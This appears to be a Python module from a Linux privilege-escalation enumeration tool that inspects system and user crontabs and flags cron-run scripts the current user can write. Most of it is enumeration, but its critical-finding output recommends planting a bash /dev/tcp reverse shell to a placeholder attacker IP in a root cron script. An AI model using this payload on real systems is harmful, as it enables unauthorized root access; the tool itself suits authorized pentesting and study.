from core import vectors
import os
import re
from core.utils import run_command, read_file, file_exists, is_writable
from core.printer import (
    print_section, print_critical, print_high,
    print_info, print_not_found
)

VECTOR_NAME = vectors.CRON_JOBS

CRON_PATHS = [
    "/etc/crontab",
    "/etc/cron.d",
    "/etc/cron.daily",
    "/etc/cron.hourly",
    "/etc/cron.weekly",
    "/etc/cron.monthly",
    "/var/spool/cron",
    "/var/spool/cron/crontabs",
]


IGNORE_PATHS = {
    "/dev/null",
    "/dev/stdout", 
    "/dev/stderr",
    "/dev/random",
    "/dev/urandom"
}

def run() -> list:
    print_section(VECTOR_NAME)
    results = []

    results += _check_system_crontab()
    results += _check_cron_dirs()
    results += _check_user_crontab()
    results += _check_writable_cron_scripts()

    if not results:
        print_not_found("Cron Jobs", {
            "Checked": ", ".join(CRON_PATHS),
            "Result" : "No cron jobs or writable scripts found"
        })
        return [{"vector": vectors.CRON_JOBS, "severity": "CLEAN", "count": 0}]

    return results


# ─────────────────────────────────────────────
# /etc/crontab
# ─────────────────────────────────────────────

def _check_system_crontab() -> list:
    content = read_file("/etc/crontab")
    if not content:
        return []

    jobs = [
        line.strip() for line in content.splitlines()
        if line.strip()
        and not line.strip().startswith("#")
        and len(line.strip()) > 5
        and not re.match(r"^[A-Z_]+=.*", line.strip())
    ]

    if not jobs:
        return []

    root_jobs = [j for j in jobs if " root " in j]

    if root_jobs:
        print_high("/etc/crontab — Root Cron Jobs Found", {
            "Jobs"     : root_jobs,
            "Risk"     : "Scripts run as root on schedule — check if scripts are writable",
            "Next Step": "Run: ls -la <script_path> to check write permissions",
            "Reference": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs"
        })
        return [{"vector": "Crontab Root Jobs", "severity": "HIGH", "count": len(root_jobs)}]

    print_info("/etc/crontab — Cron Jobs Found", {
        "Jobs"  : jobs,
        "Result": "No root cron jobs detected — review manually"
    })
    return [{"vector": "Crontab", "severity": "INFO", "count": len(jobs)}]


# ─────────────────────────────────────────────
# /etc/cron.* directories
# ─────────────────────────────────────────────

def _check_cron_dirs() -> list:
    found_scripts = []

    cron_dirs = [
        "/etc/cron.d",
        "/etc/cron.daily",
        "/etc/cron.hourly",
        "/etc/cron.weekly",
        "/etc/cron.monthly"
    ]

    for cron_dir in cron_dirs:
        if not file_exists(cron_dir):
            continue
        try:
            for f in os.listdir(cron_dir):
                full_path = os.path.join(cron_dir, f)
                found_scripts.append(full_path)
        except PermissionError:
            pass

    if not found_scripts:
        return []

    print_info("Scripts Found in /etc/cron.*", {
        "Scripts"  : found_scripts,
        "Next Step": "Check each: is it writable? Does it call writable binaries?",
        "Reference": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs"
    })
    return [{"vector": "Cron.* Scripts", "severity": "INFO", "count": len(found_scripts)}]


# ─────────────────────────────────────────────
# User Crontab
# ─────────────────────────────────────────────

def _check_user_crontab() -> list:
    output = run_command("crontab -l 2>/dev/null")

    if not output or "no crontab" in output.lower():
        return []

    jobs = [
        l.strip() for l in output.splitlines()
        if l.strip() and not l.startswith("#")
    ]

    if not jobs:
        return []

    print_info("Current User Crontab Entries", {
        "Jobs"     : jobs,
        "Next Step": "Check if any referenced scripts are writable or run as root"
    })
    return [{"vector": "User Crontab", "severity": "INFO", "count": len(jobs)}]


# ─────────────────────────────────────────────
# Writable Cron Scripts
# ─────────────────────────────────────────────

def _check_writable_cron_scripts() -> list:
    """Cron configs mein referenced scripts jo current user likh sakta hai."""
    all_content = read_file("/etc/crontab")

    for cron_dir in ["/etc/cron.d"]:
        if file_exists(cron_dir):
            try:
                for f in os.listdir(cron_dir):
                    all_content += read_file(os.path.join(cron_dir, f))
            except Exception:
                pass

    writable = []
    for line in all_content.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split()
        for part in parts:
            if (
                part.startswith("/")
                and part not in IGNORE_PATHS
                and os.path.isfile(part)
                and is_writable(part)
            ):
                writable.append(part)

    if not writable:
        return []

    print_critical("Writable Script Called by Cron", {
        "Scripts"  : writable,
        "Risk"     : "Current user can modify a script executed by root cron job",
        "Next Step": [
            "Add reverse shell to script:",
            "bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1",
            "Wait for cron to execute it"
        ],
        "Reference": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs"
    })
    return [{"vector": "Writable Cron Script", "severity": "CRITICAL", "count": len(writable)}]